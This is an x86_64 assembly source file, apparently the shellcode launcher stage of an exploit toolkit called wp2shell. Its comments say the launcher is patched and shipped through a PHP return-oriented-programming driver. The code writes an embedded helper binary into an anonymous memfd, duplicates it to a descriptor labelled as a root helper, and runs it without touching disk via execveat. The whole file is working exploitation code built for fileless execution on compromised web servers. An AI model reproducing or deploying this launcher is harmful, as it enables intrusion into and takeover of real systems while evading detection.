BITS 64
default rel

; Prebuilt x86_64 PIC launcher template.
;
; wp2shell.py patches the manifest fields below, appends the helper ELF and
; three NUL-terminated argv strings, then ships the resulting byte buffer
; through the PHP ROP driver. Large --priv-bin payloads are streamed into a
; helper-owned memfd after this launcher has started the helper.

%define ROOT_HELPER_FD  197

global _start

_start:
    jmp launcher_entry

align 8, db 0
manifest_magic:
    db 'WPRLCH1', 0
manifest_helper_offset:
    dq 0
manifest_helper_size:
    dq 0
manifest_helper_argv0_offset:
    dq 0
manifest_arg0_offset:
    dq 0
manifest_arg1_offset:
    dq 0
manifest_arg2_offset:
    dq 0

helper_memfd_name:
    db 'php-helper', 0
empty_path:
    db 0

launcher_entry:
    lea rbx, [rel _start]

    mov eax, 319                  ; memfd_create
    lea rdi, [rel helper_memfd_name]
    xor esi, esi                  ; no MFD_CLOEXEC
    syscall
    test eax, eax
    js .fail

    mov edi, eax
    mov eax, 33                   ; dup2
    mov esi, ROOT_HELPER_FD
    syscall
    test eax, eax
    js .fail

    mov edi, ROOT_HELPER_FD

    mov rsi, [rel manifest_helper_offset]
    add rsi, rbx
    mov rdx, [rel manifest_helper_size]
.write_loop:
    test rdx, rdx
    jz .written
    mov eax, 1                    ; write
    syscall
    test rax, rax
    jle .fail
    add rsi, rax
    sub rdx, rax
    jmp .write_loop

.written:
.argv:
    xor eax, eax
    push rax                      ; argv terminator

    mov rax, [rel manifest_arg2_offset]
    add rax, rbx
    push rax
    mov rax, [rel manifest_arg1_offset]
    add rax, rbx
    push rax
    mov rax, [rel manifest_arg0_offset]
    add rax, rbx
    push rax
    mov rax, [rel manifest_helper_argv0_offset]
    add rax, rbx
    push rax

    mov edi, ROOT_HELPER_FD
    lea rsi, [rel empty_path]
    mov rdx, rsp
    xor r10d, r10d
    mov r8d, 0x1000               ; AT_EMPTY_PATH
    mov eax, 322                  ; execveat
    syscall

.fail:
    mov eax, 60                   ; exit
    mov edi, 1
    syscall
